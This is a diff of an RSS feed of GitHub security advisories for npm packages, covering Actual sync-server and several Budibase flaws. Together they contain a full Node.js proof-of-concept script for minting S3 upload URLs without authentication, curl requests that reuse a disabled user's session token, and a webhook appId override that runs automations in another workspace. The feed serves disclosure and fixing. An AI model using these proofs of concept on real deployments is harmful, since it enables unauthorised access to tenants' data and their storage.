@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
     <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
-    <updated>2026-06-22T22:31:12.684Z</updated>
+    <updated>2026-06-22T23:27:47.145Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
     <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
@@ -11,6 +11,1203 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[@actual-app/sync-server] @actual-app/sync-server: Disabled OpenID users keep access through existing session tokens]]></title>
+        <id>https://github.com/advisories/GHSA-cq9c-6w48-qmfg</id>
+        <link href="https://github.com/advisories/GHSA-cq9c-6w48-qmfg"/>
+        <updated>2026-06-22T23:20:56.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>In OpenID multi-user mode, disabling a user only blocks future OpenID login for that identity. Existing Actual session tokens for the disabled user remain valid, so the user can continue calling authenticated server endpoints after an administrator has disabled the account.</p>
+<h3 id="details">Details</h3>
+<p>The disabled-user check is present during OpenID login finalization. Existing users are only accepted when the matching row has <code>enabled = 1</code>, and a disabled row causes the OpenID grant to fail before a new session token is created.</p>
+<pre><code class="language-ts">// packages/sync-server/src/accounts/openid.ts:284-291
+const { id: userIdFromDb, display_name: displayName } =
+  accountDb.first(
+    'SELECT id, display_name FROM users WHERE user_name = ? and enabled = 1',
+    [identity],
+  ) || {};
+
+if (userIdFromDb == null) {
+  throw new Error('openid-grant-failed');
+}
+</code></pre>
+<p>The shared session validation path does not perform the same enabled-user check. It accepts any existing token row that has not expired, then returns the session object to every route protected by <code>validateSessionMiddleware</code>.</p>
+<pre><code class="language-ts">// packages/sync-server/src/util/validate-user.ts:10-41
+export function validateSession(req: Request, res: Response) {
+  let { token } = req.body || {};
+  if (!token) {
+    token = req.headers['x-actual-token'];
+  }
+
+  const session = getSession(token);
+  ...
+  return session;
+}
+</code></pre>
+<p>This means account disablement and session authorization diverge:</p>
+<pre><code class="language-text">OpenID login path: users.enabled must be 1
+Existing session path: token exists and is not expired; users.enabled is not checked
+</code></pre>
+<p>The default token expiration setting is <code>never</code>, so this is not just a short race after disablement on default deployments.</p>
+<pre><code class="language-js">// packages/sync-server/src/load-config.js:260-264
+token_expiration: {
+  doc: 'Token expiration time.',
+  format: 'tokenExpiration',
+  default: 'never',
+  env: 'ACTUAL_TOKEN_EXPIRATION',
+},
+</code></pre>
+<p>Admins can change a user's enabled state through the user update route, but that update does not delete the user's existing sessions. After the update, the old token still satisfies <code>validateSession</code>.</p>
+<pre><code class="language-js">// packages/sync-server/src/app-admin.js:91-101
+app.patch('/users', validateSessionMiddleware, async (req, res) =&gt; {
+  if (!isAdmin(res.locals.user_id)) {
+    ...
+  }
+
+  const { id, userName, role, displayName, enabled } = req.body || {};
+</code></pre>
+<pre><code class="language-ts">// packages/sync-server/src/services/user-service.ts:98-102
+getAccountDb().mutate(
+  'UPDATE users SET user_name = ?, display_name = ?, enabled = ?, role = ? WHERE id = ?',
+  [userName, displayName, enabled, roleId, userId],
+);
+</code></pre>
+<p>Authenticated server features then continue to trust that session. For example, the sync API installs <code>validateSessionMiddleware</code> for the whole router, so a disabled user can keep using any sync operation that their still-valid session and existing file ownership/access allow.</p>
+<pre><code class="language-ts">// packages/sync-server/src/app-sync.ts:37-39
+const app = express();
+app.use(validateSessionMiddleware);
+app.use(errorMiddleware);
+</code></pre>
+<p>This is distinct from the previously published cross-user sync authorization issue: the attacker does not need to access another user's file ID. The bypass is that a disabled user's own session remains authorized after account disablement.</p>
+<h3 id="poc">PoC</h3>
+<ol>
+<li>Run an Actual Sync Server in OpenID multi-user mode with <code>@actual-app/sync-server</code> 26.5.0. Use the default token expiration setting, or any setting where the token has not expired yet.</li>
+<li>Log in as a non-admin OpenID user and save the returned Actual session token.</li>
+<li>As an admin, disable that same user through <code>PATCH /admin/users</code> by sending <code>enabled: false</code>.</li>
+<li>Reuse the old token against a protected endpoint.</li>
+</ol>
+<p>Example success check:</p>
+<pre><code class="language-bash">curl -s https://actual.example.com/account/validate \
+  -H 'X-Actual-Token: &lt;disabled_user_existing_token&gt;'
+</code></pre>
+<p>Expected result on the affected code path: the request is still treated as authenticated and returns the disabled user's account/session information instead of <code>401</code> or <code>403</code>.</p>
+<p>A sync-facing check uses the same session validation primitive:</p>
+<pre><code class="language-bash">curl -s https://actual.example.com/sync/list-user-files \
+  -H 'X-Actual-Token: &lt;disabled_user_existing_token&gt;'
+</code></pre>
+<p>Expected result on the affected code path: the disabled user can still list and operate on budget files that the stale session is otherwise allowed to access.</p>
+<h3 id="impact">Impact</h3>
+<p>A disabled OpenID user can keep post-authentication access until the session row is deleted or expires. With the default <code>token_expiration: never</code>, this can persist indefinitely.</p>
+<p>For a disabled basic user, the confirmed impact is continued access to that user's own budgets and any budgets shared with that user, including sensitive financial data and allowed mutations. For a disabled admin user, the impact is broader because the existing token can still satisfy admin role checks; that condition preserves administrative access after the account was disabled.</p>
+<p>The missing rule is that session validation should reject disabled users, and disabling or deleting a user should revoke that user's existing sessions.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/actualbudget/actual/security/advisories/GHSA-cq9c-6w48-qmfg">https://github.com/actualbudget/actual/security/advisories/GHSA-cq9c-6w48-qmfg</a></li>
+<li><a href="https://github.com/advisories/GHSA-cq9c-6w48-qmfg">https://github.com/advisories/GHSA-cq9c-6w48-qmfg</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-cq9c-6w48-qmfg</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-06-22T23:19:56.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[@budibase/server] Budibase: POST /api/attachments/:datasourceId/url is unauthenticated and lets anonymous callers mint S3 PUT pre-signed URLs using stored datasource IAM credentials]]></title>
+        <id>https://github.com/advisories/GHSA-35c4-rvc8-frhm</id>
+        <link href="https://github.com/advisories/GHSA-35c4-rvc8-frhm"/>
+        <updated>2026-06-22T23:20:56.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The Budibase server route <code>POST /api/attachments/:datasourceId/url</code> (<a href="https://github.com/Budibase/budibase/blob/56d2a984/packages/server/src/api/routes/static.ts"><code>packages/server/src/api/routes/static.ts</code></a>) is registered with <strong>only</strong> the <code>recaptcha</code> middleware. There is no <code>authorized(...)</code> middleware in the chain. The controller (<code>packages/server/src/api/controllers/static/index.ts::getSignedUploadURL</code>) looks the requested datasource up, instantiates an AWS S3 client with the datasource's stored <code>accessKeyId</code> / <code>secretAccessKey</code>, and returns an AWS Signature V4 pre-signed <code>PutObjectCommand</code> URL for the caller-supplied <code>bucket</code> and <code>key</code>. The <code>bucket</code> is not pinned to the datasource's configured bucket.</p>
+<p>The workspace context required by <code>sdk.datasources.get</code> is sourced by <code>getWorkspaceIdFromCtx</code> (<a href="https://github.com/Budibase/budibase/blob/56d2a984/packages/backend-core/src/utils/utils.ts"><code>packages/backend-core/src/utils/utils.ts</code></a>) from any of: the <code>x-budibase-app-id</code> header, the JSON body <code>appId</code>, a path segment that begins with the workspace prefix, or <code>?appId=</code>. <code>auth.buildAuthMiddleware([], { publicAllowed: true })</code> runs before any of this and explicitly allows anonymous requests. The <code>currentWorkspace</code> middleware's "deny access to dev preview" branch only triggers under <code>isBrowser(ctx) &amp;&amp; !isApiKey(ctx)</code>; <code>isBrowser</code> checks the parsed <code>User-Agent</code> for a recognised browser, so any non-browser client (curl, the supplied PoC, any tool not setting a browser UA) is neither and reaches dev workspaces too.</p>
+<p>Net effect: an anonymous attacker who knows or can enumerate a workspace id (<code>app_...</code>) and an S3-source datasource id (<code>ds_...</code>) can call this endpoint with no auth and obtain a 15-minute pre-signed PUT URL minted on the victim's IAM identity. The endpoint also returns the <code>publicUrl</code> so the attacker knows exactly where their PUT lands. Because <code>bucket</code> is attacker-controlled, the attacker can write to any bucket those IAM credentials can write to, not only the bucket the datasource was configured for.</p>
+<h2 id="affected-code">Affected code</h2>
+<p><a href="https://github.com/Budibase/budibase/blob/56d2a984/packages/server/src/api/routes/static.ts"><code>packages/server/src/api/routes/static.ts</code></a> at HEAD <code>56d2a984</code> (<code>master</code>, 2026-05-18):</p>
+<pre><code class="language-ts">import { permissions } from "@budibase/backend-core"
+import Router from "@koa/router"
+import { authorizedMiddleware as authorized } from "../../middleware/authorized"
+import recaptcha from "../../middleware/recaptcha"
+import { paramResource } from "../../middleware/resourceId"
+import * as controller from "../controllers/static"
+
+const { BUILDER, PermissionType, PermissionLevel } = permissions
+
+const router: Router = new Router()
+// ...
+router
+  .post("/api/attachments/process", authorized(BUILDER), controller.uploadFile)
+  .post("/api/pwa/process-zip", authorized(BUILDER), controller.processPWAZip)
+  .post(
+    "/api/attachments/:tableId/upload",
+    recaptcha,
+    paramResource("tableId"),
+    authorized(PermissionType.TABLE, PermissionLevel.WRITE),
+    controller.uploadFile
+  )
+  // ...
+  .post(
+    "/api/attachments/:datasourceId/url",
+    recaptcha,
+    controller.getSignedUploadURL                       // &lt;- no authorized(...)
+  )
+</code></pre>
+<p>Note the asymmetry: every other mutating endpoint on this router carries an <code>authorized(...)</code> middleware. The signed-URL endpoint does not.</p>
+<p><a href="https://github.com/Budibase/budibase/blob/56d2a984/packages/server/src/api/controllers/static/index.ts#L595-L645"><code>packages/server/src/api/controllers/static/index.ts:595-645</code></a>:</p>
+<pre><code class="language-ts">export const getSignedUploadURL = async function (ctx) {
+  let datasource
+  try {
+    const { datasourceId } = ctx.params
+    datasource = await sdk.datasources.get(datasourceId, { enriched: true })
+    if (!datasource) {
+      ctx.throw(400, "The specified datasource could not be found")
+    }
+  } catch (error) {
+    ctx.throw(400, "The specified datasource could not be found")
+  }
+
+  let signedUrl, publicUrl
+  const awsRegion = (datasource?.config?.region || "eu-west-1") as string
+  if (datasource?.source === "S3") {
+    const { bucket, key } = ctx.request.body || {}
+    if (!bucket || !key) {
+      ctx.throw(400, "bucket and key values are required")
+    }
+    try {
+      let endpoint = datasource?.config?.endpoint
+      if (endpoint &amp;&amp; !utils.urlHasProtocol(endpoint)) {
+        endpoint = `https://${endpoint}`
+      }
+      const s3 = new S3({
+        region: awsRegion,
+        endpoint,
+        credentials: {
+          accessKeyId: datasource?.config?.accessKeyId as string,
+          secretAccessKey: datasource?.config?.secretAccessKey as string,
+        },
+      })
+      const params = { Bucket: bucket, Key: key }
+      signedUrl = await getSignedUrl(s3, new PutObjectCommand(params))
+      if (endpoint) {
+        publicUrl = `${endpoint}/${bucket}/${key}`
+      } else {
+        publicUrl = `https://${bucket}.s3.${awsRegion}.amazonaws.com/${key}`
+      }
+    } catch (error: any) {
+      ctx.throw(400, error)
+    }
+  }
+
+  ctx.body = { signedUrl, publicUrl }
+}
+</code></pre>
+<p><code>sdk.datasources.get(datasourceId, { enriched: true })</code> (<a href="https://github.com/Budibase/budibase/blob/56d2a984/packages/server/src/sdk/workspace/datasources/datasources.ts"><code>packages/server/src/sdk/workspace/datasources/datasources.ts</code></a>) does the workspace DB read and <strong>also</strong> substitutes <code>{{ env.* }}</code> references in the config via <code>processObjectSync</code>, so even if the operator stored credentials as environment-variable references, those values are resolved before the S3 client is built.</p>
+<p><code>recaptcha</code> (<a href="https://github.com/Budibase/budibase/blob/56d2a984/packages/server/src/middleware/recaptcha.ts"><code>packages/server/src/middleware/recaptcha.ts</code></a>) short-circuits to <code>next()</code> whenever the workspace either is not a production workspace or does not have <code>features.recaptchaEnabled = true</code> on its metadata. Neither is set by default. Even on workspaces with recaptcha enabled, builders carrying the <code>x-budibase-type: builder</code> header skip the check, but that branch is irrelevant here — the broader case is that an anonymous attacker simply chooses a non-prod workspace (which is the default for any in-development app) and the middleware no-ops.</p>
+<h2 id="reproduction">Reproduction</h2>
+<p>Proof-of-concept Node.js script (no AWS SDK dependency, no external libraries):</p>
+<pre><code class="language-js">#!/usr/bin/env node
+// PoC: Unauthenticated S3 signed-upload-URL minting in Budibase
+// usage: node poc.js &lt;budibase-base-url&gt; &lt;app-id&gt; &lt;datasource-id&gt;
+
+"use strict"
+const http = require("http")
+const https = require("https")
+const { URL } = require("url")
+
+function postJson(targetUrl, headers, body) {
+  return new Promise((resolve, reject) =&gt; {
+    const u = new URL(targetUrl)
+    const lib = u.protocol === "https:" ? https : http
+    const payload = Buffer.from(JSON.stringify(body), "utf8")
+    const req = lib.request(
+      {
+        method: "POST",
+        protocol: u.protocol,
+        hostname: u.hostname,
+        port: u.port || (u.protocol === "https:" ? 443 : 80),
+        path: u.pathname + u.search,
+        headers: Object.assign(
+          {
+            "Content-Type": "application/json",
+            "Content-Length": payload.length,
+            // Deliberately not a recognised browser UA so the
+            // currentWorkspace dev-preview redirect does not fire.
+            "User-Agent": "budibase-poc/1.0",
+          },
+          headers || {}
+        ),
+      },
+      res =&gt; {
+        const chunks = []
+        res.on("data", c =&gt; chunks.push(c))
+        res.on("end", () =&gt;
+          resolve({
+            status: res.statusCode,
+            body: Buffer.concat(chunks).toString("utf8"),
+          })
+        )
+      }
+    )
+    req.on("error", reject)
+    req.write(payload)
+    req.end()
+  })
+}
+
+async function main() {
+  const [baseUrl, appId, datasourceId] = process.argv.slice(2)
+  if (!baseUrl || !appId || !datasourceId) {
+    console.error("usage: node poc.js &lt;baseUrl&gt; &lt;appId&gt; &lt;datasourceId&gt;")
+    process.exit(2)
+  }
+  const bucket = process.env.POC_BUCKET || "attacker-chosen-bucket"
+  const key = process.env.POC_KEY || `pwn/${Date.now()}.html`
+  const url = baseUrl.replace(/\/$/, "") +
+    `/api/attachments/${encodeURIComponent(datasourceId)}/url`
+  const resp = await postJson(
+    url,
+    { "x-budibase-app-id": appId },
+    { bucket, key }
+  )
+  console.log(`HTTP ${resp.status}`)
+  console.log(resp.body)
+}
+
+main().catch(err =&gt; {
+  console.error(err)
+  process.exit(1)
+})
+</code></pre>
+<p>Wire-level request:</p>
+<pre><code>POST /api/attachments/ds_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx/url HTTP/1.1
+Host: budibase.example:10000
+x-budibase-app-id: app_dev_yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy
+Content-Type: application/json
+User-Agent: budibase-poc/1.0
+Content-Length: 36
+
+{"bucket":"victim-bucket","key":"x.html"}
+</code></pre>
+<p>Response:</p>
+<pre><code>HTTP/1.1 200 OK
+Content-Type: application/json
+
+{
+  "signedUrl": "https://victim-bucket.s3.eu-west-1.amazonaws.com/x.html?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=AKIA...%2F20260519%2Feu-west-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20260519T120000Z&amp;X-Amz-Expires=900&amp;X-Amz-Signature=...&amp;X-Amz-SignedHeaders=host&amp;x-id=PutObject",
+  "publicUrl": "https://victim-bucket.s3.eu-west-1.amazonaws.com/x.html"
+}
+</code></pre>
+<p>The attacker then PUTs arbitrary bytes to <code>signedUrl</code> and they land at <code>publicUrl</code>, signed by — and IAM-scoped to — the victim's stored S3 credentials.</p>
+<p>The existing test that exercises the endpoint, <a href="https://github.com/Budibase/budibase/blob/56d2a984/packages/server/src/api/routes/tests/static.spec.ts#L123-L146"><code>packages/server/src/api/routes/tests/static.spec.ts:123-146</code></a>, sends the same request with <code>config.defaultHeaders()</code> (a builder auth cookie). That confirms the request shape; no negative-auth test (<code>.set({})</code> or <code>publicHeaders()</code>) exists for this route, which is how the missing <code>authorized(...)</code> slipped past code review.</p>
+<h2 id="impact">Impact</h2>
+<ul>
+<li><strong>Confidentiality / Integrity</strong>: any anonymous internet user can write arbitrary objects to any bucket the configured IAM credentials can write to. The <code>bucket</code> parameter is attacker-controlled, so the blast radius is the full IAM policy attached to the credential, not just the bucket the operator wired into the datasource. Typical realistic outcomes: planting HTML/JS that the bucket serves at a known path (the response gives back <code>publicUrl</code>), overwriting an existing key the application later reads back as trusted data, racking up S3 storage / PUT cost.</li>
+<li><strong>Availability</strong>: storage / cost exhaustion. Repeated PUTs of large objects to attacker-chosen keys cost the victim.</li>
+<li><strong>Authorization scope leak</strong>: the endpoint discloses (a) whether a given <code>datasourceId</code> exists and is S3-typed (200 vs 400 'not found'), and (b) the resolved <code>publicUrl</code> which includes the region.</li>
+</ul>
+<p>No MFA / OAuth / per-user check exists between the request and the issued pre-signed URL. The credentials are not returned in plaintext, but the pre-signed URL is functionally equivalent to a 15-minute capability to PUT to the chosen <code>bucket</code>/<code>key</code>.</p>
+<h2 id="suggested-fix">Suggested fix</h2>
+<p>Attach <code>authorized(PermissionType.TABLE, PermissionLevel.WRITE)</code> (or a higher gate, e.g. <code>BUILDER</code>, depending on intended audience) to the route, mirroring the sibling <code>/api/attachments/:tableId/upload</code> registration. Additionally, validate that the requested <code>bucket</code> matches <code>datasource.config.bucket</code> so the IAM blast radius is reduced to the configured bucket only.</p>
+<p>Minimal patch shape:</p>
+<pre><code class="language-ts">.post(
+  "/api/attachments/:datasourceId/url",
+  recaptcha,
+  paramResource("datasourceId"),
+  authorized(PermissionType.TABLE, PermissionLevel.WRITE),
+  controller.getSignedUploadURL
+)
+</code></pre>
+<p>And in the controller, before calling <code>getSignedUrl</code>:</p>
+<pre><code class="language-ts">const configuredBucket = datasource?.config?.bucket
+if (configuredBucket &amp;&amp; bucket !== configuredBucket) {
+  ctx.throw(400, "bucket does not match configured datasource bucket")
+}
+</code></pre>
+<h2 id="credit">Credit</h2>
+<p>Reported by <code>tonghuaroot</code> (<code>tonghuaroot@gmail.com</code>).</p>
+<h2 id="fix-pr">Fix PR</h2>
+<p>A candidate fix has been prepared on the temporary private fork that was created from this advisory:</p>
+<ul>
+<li>PR: <a href="https://github.com/Budibase/budibase-ghsa-35c4-rvc8-frhm/pull/1">https://github.com/Budibase/budibase-ghsa-35c4-rvc8-frhm/pull/1</a></li>
+<li>Branch: <code>fix/attachment-url-auth-and-bucket-pin</code></li>
+<li>Commit: <code>Require builder auth and pin bucket on POST /api/attachments/:datasourceId/url</code></li>
+</ul>
+<p>The patch is the canonical two-part fix:</p>
+<ol>
+<li>Attach <code>authorized(BUILDER)</code> to <code>POST /api/attachments/:datasourceId/url</code> on <a href="https://github.com/Budibase/budibase/blob/56d2a984/packages/server/src/api/routes/static.ts"><code>packages/server/src/api/routes/static.ts</code></a>, mirroring the surrounding <code>POST /api/attachments/process</code> and <code>POST /api/pwa/process-zip</code> registrations. Anonymous callers now receive 401 regardless of whether the <code>recaptcha</code> middleware fails open.</li>
+<li>Pin <code>Bucket</code> to <code>datasource.config.bucket</code> inside <code>getSignedUploadURL</code> (<a href="https://github.com/Budibase/budibase/blob/56d2a984/packages/server/src/api/controllers/static/index.ts"><code>packages/server/src/api/controllers/static/index.ts</code></a>) and ignore any <code>bucket</code> value supplied in the request body. If the datasource has no bucket configured, the route now returns 400 instead of issuing an unbounded pre-signed URL.</li>
+</ol>
+<p>Two regression tests are added in <a href="https://github.com/Budibase/budibase/blob/56d2a984/packages/server/src/api/routes/tests/static.spec.ts"><code>packages/server/src/api/routes/tests/static.spec.ts</code></a>:</p>
+<ul>
+<li><code>should reject unauthenticated callers</code> (anonymous request with <code>config.publicHeaders()</code> now returns 401, was 200 before).</li>
+<li><code>should ignore a client-supplied bucket and pin to the datasource's configured bucket</code> (authenticated request with body <code>{ bucket: "other-bucket", key: "bar" }</code> returns a signed URL bound to <code>foo.s3.eu-west-1.amazonaws.com/bar</code>, not <code>other-bucket</code>).</li>
+</ul>
+<p>Test run on the patch (Jest, <code>packages/server</code>):</p>
+<pre><code>PASS src/api/routes/tests/static.spec.ts
+  /static
+    /attachments
+      generateSignedUrls
+        v should be able to generate a signed upload URL
+        v should reject unauthenticated callers
+        v should ignore a client-supplied bucket and pin to the datasource's configured bucket
+        v should reject when the datasource has no configured bucket
+        v should handle an invalid datasource ID
+        v should require a key parameter
+</code></pre>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/Budibase/budibase/security/advisories/GHSA-35c4-rvc8-frhm">https://github.com/Budibase/budibase/security/advisories/GHSA-35c4-rvc8-frhm</a></li>
+<li><a href="https://github.com/advisories/GHSA-35c4-rvc8-frhm">https://github.com/advisories/GHSA-35c4-rvc8-frhm</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-35c4-rvc8-frhm</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-06-22T23:19:26.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[@budibase/server] Budibase: Mass Assignment in Webhook Trigger Allows Cross-Workspace Automation Execution via appId Override]]></title>
+        <id>https://github.com/advisories/GHSA-rgvg-3wpc-h44p</id>
+        <link href="https://github.com/advisories/GHSA-rgvg-3wpc-h44p"/>
+        <updated>2026-06-22T23:20:55.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The webhook trigger endpoint in Budibase is publicly accessible and passes the full HTTP request body into automation execution parameters. A mass assignment vulnerability in <code>externalTrigger()</code> allows an attacker to overwrite the internal <code>appId</code> property by including it in the webhook POST body. When the automation is processed asynchronously (the default path for webhooks without a collect step), the worker executes the attacker-defined automation in the context of the victim's workspace, granting full read/write access to the victim's database.</p>
+<h2 id="details">Details</h2>
+<p>The webhook trigger route is registered as a public endpoint with no authentication:</p>
+<pre><code class="language-typescript">// packages/server/src/api/routes/webhook.ts:12
+publicRoutes.post("/api/webhooks/trigger/:instance/:id", controller.trigger)
+</code></pre>
+<p>The controller passes the raw request body as <code>fields</code> alongside the server-derived <code>appId</code>:</p>
+<pre><code class="language-typescript">// packages/server/src/api/controllers/webhook.ts:142-148
+await triggers.externalTrigger(target, {
+  fields: {
+    ...ctx.request.body,  // attacker-controlled
+    body: ctx.request.body,
+  },
+  appId: prodAppId,       // server-controlled
+})
+</code></pre>
+<p>In <code>externalTrigger()</code>, for webhook-triggered automations, <code>params.fields</code> is spread back into <code>params</code>:</p>
+<pre><code class="language-typescript">// packages/server/src/automations/triggers.ts:237-241
+params = {
+  ...params,          // appId: prodAppId (server-controlled)
+  ...params.fields,   // appId: VICTIM_ID (attacker-controlled, overwrites above)
+  fields: {},
+}
+</code></pre>
+<p>Because <code>params.fields</code> is spread <strong>after</strong> <code>params</code>, any key in the attacker's body overwrites the corresponding property in <code>params</code>. An attacker including <code>"appId": "app_VICTIM_WORKSPACE_ID"</code> in the POST body overwrites the legitimate, server-derived <code>appId</code>.</p>
+<p>The contaminated params become <code>data.event</code> and are queued asynchronously:</p>
+<pre><code class="language-typescript">// packages/server/src/automations/triggers.ts:244,271
+const data: AutomationData = { automation, event: params }
+// ...
+return quotas.addAction(() =&gt; automationQueue.add(data, JOB_OPTS))
+</code></pre>
+<p>The async worker uses <code>job.data.event.appId</code> to set the workspace context:</p>
+<pre><code class="language-typescript">// packages/server/src/threads/automation.ts:917,929-930
+const workspaceId = job.data.event.appId  // attacker-controlled
+// ...
+return await context.doInAutomationContext({
+  workspaceId,  // victim's workspace
+  automationId,
+  task: async () =&gt; { /* automation steps run here */ }
+})
+</code></pre>
+<p>The synchronous path (for webhooks with a collect step) correctly overwrites <code>appId</code> at <code>triggers.ts:264</code>:</p>
+<pre><code class="language-typescript">data.event = {
+  ...data.event,
+  appId: context.getWorkspaceId(),  // server-controlled fix
+  automation,
+}
+</code></pre>
+<p>This proves the developers intended <code>appId</code> to be server-controlled but missed applying the same fix to the async path, which is the default for all webhooks without a collect step.</p>
+<h2 id="poc">PoC</h2>
+<p><strong>Prerequisites:</strong> Attacker has builder access to their own Budibase workspace and knows a victim workspace ID (format: <code>app_&lt;uuid&gt;</code>).</p>
+<p><strong>Step 1:</strong> Attacker creates an automation in their own workspace with a webhook trigger and data-exfiltration steps (e.g., Query Rows → Execute Script to send data externally).</p>
+<p><strong>Step 2:</strong> Attacker creates a webhook for that automation and notes the webhook URL:</p>
+<pre><code>POST /api/webhooks/trigger/&lt;ATTACKER_INSTANCE&gt;/&lt;WEBHOOK_ID&gt;
+</code></pre>
+<p><strong>Step 3:</strong> Attacker triggers the webhook with the victim's workspace ID injected into the body:</p>
+<pre><code class="language-bash">curl -X POST https://budibase.example.com/api/webhooks/trigger/app_ATTACKER_ID/wh_WEBHOOK_ID \
+  -H 'Content-Type: application/json' \
+  -d '{"appId": "app_VICTIM_WORKSPACE_ID", "normalData": "test"}'
+</code></pre>
+<p><strong>Expected result:</strong> The automation defined in the attacker's workspace executes in the context of the victim's workspace. All database operations (Query Rows, Create Row, Delete Row, Execute Script, etc.) operate on the victim's data.</p>
+<p><strong>Additional overridable fields via the same mechanism:</strong></p>
+<ul>
+<li><code>timeout</code> (<code>automation.ts:443-444</code>): override automation execution timeout</li>
+<li><code>user</code> (<code>automation.ts:413,435</code>): set user context for automation steps</li>
+<li><code>metadata.automationChainCount</code> (<code>automation.ts:293</code>): bypass chain depth limits</li>
+</ul>
+<h2 id="impact">Impact</h2>
+<p>An attacker with builder access to their own Budibase workspace can execute arbitrary automations (of their own design) in the context of any other workspace on the same Budibase instance, provided they know the victim's workspace ID. This enables:</p>
+<ul>
+<li><strong>Full data exfiltration</strong>: Query Rows steps read all tables in the victim's workspace</li>
+<li><strong>Data manipulation</strong>: Create Row, Update Row, Delete Row steps modify victim data</li>
+<li><strong>Arbitrary code execution in victim context</strong>: Execute Script steps run JavaScript with access to victim's environment variables and database</li>
+<li><strong>Cross-tenant boundary violation</strong>: In multi-tenant deployments (Budibase Cloud), the tenant ID is derived from the workspace ID, so the attack crosses tenant boundaries</li>
+</ul>
+<p>The attack requires no authentication (the webhook endpoint is public) and leaves minimal audit trail since the automation execution is attributed to the attacker's automation definition but runs in the victim's context.</p>
+<h2 id="recommended-fix">Recommended Fix</h2>
+<p>In <code>packages/server/src/automations/triggers.ts</code>, apply the same <code>appId</code> fix that exists in the synchronous path to the async path as well. The fix should ensure <code>appId</code> is always server-controlled before queuing:</p>
+<pre><code class="language-typescript">// packages/server/src/automations/triggers.ts:244-272
+const data: AutomationData = { automation, event: params }
+
+// ... trigger filter check ...
+
++ // Ensure appId is always server-controlled, not user-supplied
++ data.event.appId = context.getWorkspaceId()
+
+if (getResponses) {
+  data.event = {
+    ...data.event,
+    appId: context.getWorkspaceId(),
+    automation,
+  }
+  return quotas.addAction(() =&gt;
+    executeInThread({ data } as AutomationJob, { onProgress })
+  )
+} else {
+  return quotas.addAction(() =&gt; automationQueue.add(data, JOB_OPTS))
+}
+</code></pre>
+<p>Alternatively, use an allowlist approach for the webhook field spread to prevent any internal property from being overwritten:</p>
+<pre><code class="language-typescript">// packages/server/src/automations/triggers.ts:237-241
+const { appId, timeout, user, metadata, ...safeFields } = params.fields
+params = {
+  ...params,
+  ...safeFields,
+  fields: {},
+}
+</code></pre>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/Budibase/budibase/security/advisories/GHSA-rgvg-3wpc-h44p">https://github.com/Budibase/budibase/security/advisories/GHSA-rgvg-3wpc-h44p</a></li>
+<li><a href="https://github.com/advisories/GHSA-rgvg-3wpc-h44p">https://github.com/advisories/GHSA-rgvg-3wpc-h44p</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-rgvg-3wpc-h44p</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-06-22T23:20:20.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[@budibase/server] Budibase: Unauthenticated S3 signed upload URL generation allows arbitrary writes with stored datasource credentials]]></title>
+        <id>https://github.com/advisories/GHSA-jj36-r9w3-3pfh</id>
+        <link href="https://github.com/advisories/GHSA-jj36-r9w3-3pfh"/>
+        <updated>2026-06-22T23:15:11.000Z</updated>
+        <content type="html"><![CDATA[<p>The application server exposes an unauthenticated endpoint that generates S3 <code>PutObject</code> presigned URLs using credentials stored in a workspace datasource. The route is protected only by the recaptcha middleware and does not require authentication, table permission, datasource permission, or builder access. A public caller who knows a workspace ID and S3 datasource ID can request a signed upload URL for attacker-controlled bucket and key values.</p>
+<h3 id="details">Details</h3>
+<p>The static route registers the signed upload URL endpoint with only <code>recaptcha</code> before the controller:</p>
+<ul>
+<li><code>packages/server/src/api/routes/static.ts:44-48</code></li>
+</ul>
+<pre><code class="language-ts">44:  .post(
+45:    "/api/attachments/:datasourceId/url",
+46:    recaptcha,
+47:    controller.getSignedUploadURL
+48:  )
+</code></pre>
+<p>The controller loads the datasource by <code>datasourceId</code> with enriched secret values:</p>
+<ul>
+<li><code>packages/server/src/api/controllers/static/index.ts:590-598</code></li>
+</ul>
+<pre><code class="language-ts">590:export const getSignedUploadURL = async function (
+591:  ctx: Ctx&lt;GetSignedUploadUrlRequest, GetSignedUploadUrlResponse&gt;
+592:) {
+593:  // Ensure datasource is valid
+594:  let datasource
+595:  try {
+596:    const { datasourceId } = ctx.params
+597:    datasource = await sdk.datasources.get(datasourceId, { enriched: true })
+598:    if (!datasource) {
+</code></pre>
+<p>The request body controls <code>bucket</code> and <code>key</code>, and the server signs a PUT URL using the stored datasource credentials:</p>
+<ul>
+<li><code>packages/server/src/api/controllers/static/index.ts:609-629</code></li>
+</ul>
+<pre><code class="language-ts">609:  if (datasource?.source === "S3") {
+610:    const { bucket, key } = ctx.request.body || {}
+611:    if (!bucket || !key) {
